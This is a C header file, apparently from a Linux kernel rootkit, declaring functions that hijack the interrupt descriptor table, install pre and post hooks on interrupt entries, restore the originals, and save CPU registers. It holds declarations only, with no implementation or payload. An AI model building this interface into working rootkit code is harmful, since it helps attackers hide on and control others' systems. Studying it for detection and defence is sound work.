#ifndef ROOTKIT_IDT_H
# define ROOTKIT_IDT_H

enum idt_hijack_method {
    IDT_TABLE = 1,
    IDT_ENTRY = 2,
};

#define IRET 0              //return from the handler
#define IRET_ORIG 1         //execute the original handler
#define IRET_ORIG_POST -1   //execute the original handler and the post hook

void idt_substitute(enum idt_hijack_method m);
void idt_restore(void);

void idt_set_hook(int n, void *pre, void *post);
void idt_hook_enable(int entry);
void idt_hook_disable(int entry);

struct slrk_regs {
    unsigned long rsp;
    unsigned long r15;
    unsigned long r14;
    unsigned long r13;
    unsigned long r12;
    unsigned long rbp;
    unsigned long rbx;
    unsigned long r11;
    unsigned long r10;
    unsigned long r9;
    unsigned long r8;
    unsigned long rax;
    unsigned long rcx;
    unsigned long rdx;
    unsigned long rsi;
    unsigned long rdi;
    unsigned long orig_rax;
/* cpu exception frame or undefined */
    unsigned long error_code;
    unsigned long rip;
    unsigned long cs;
    unsigned long rflags;
    unsigned long sp;
    unsigned long ss;
/* top of stack page */
};

#endif /* !ROOTKIT_IDT_H */
